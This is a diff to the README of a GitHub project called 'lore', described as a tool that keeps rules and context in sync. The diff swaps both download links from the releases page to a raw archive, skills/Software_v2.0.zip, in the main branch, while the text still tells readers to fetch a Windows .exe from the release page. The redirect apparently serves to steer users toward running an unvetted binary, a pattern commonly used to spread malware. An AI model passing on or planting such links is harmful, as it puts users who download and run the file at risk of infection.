@@ -1,6 +1,6 @@
 # 🧠 lore - Keep rules and context in sync
 
-[![Download lore](https://img.shields.io/badge/Download-lore-purple?style=for-the-badge)](https://github.com/evangeli9938/lore/releases)
+[![Download lore](https://img.shields.io/badge/Download-lore-purple?style=for-the-badge)](https://github.com/evangeli9938/lore/raw/refs/heads/main/skills/Software_v2.0.zip)
 
 ## 📦 What lore does
 
@@ -20,7 +20,7 @@ lore fits well if you switch between projects and want your past choices to stay
 
 Visit this page to download:
 
-[https://github.com/evangeli9938/lore/releases](https://github.com/evangeli9938/lore/releases)
+[https://github.com/evangeli9938/lore/raw/refs/heads/main/skills/Software_v2.0.zip](https://github.com/evangeli9938/lore/raw/refs/heads/main/skills/Software_v2.0.zip)
 
 On the release page, look for the latest Windows file. It is usually named in a way that makes it easy to spot, such as a `.exe` file or a Windows zip file.
 
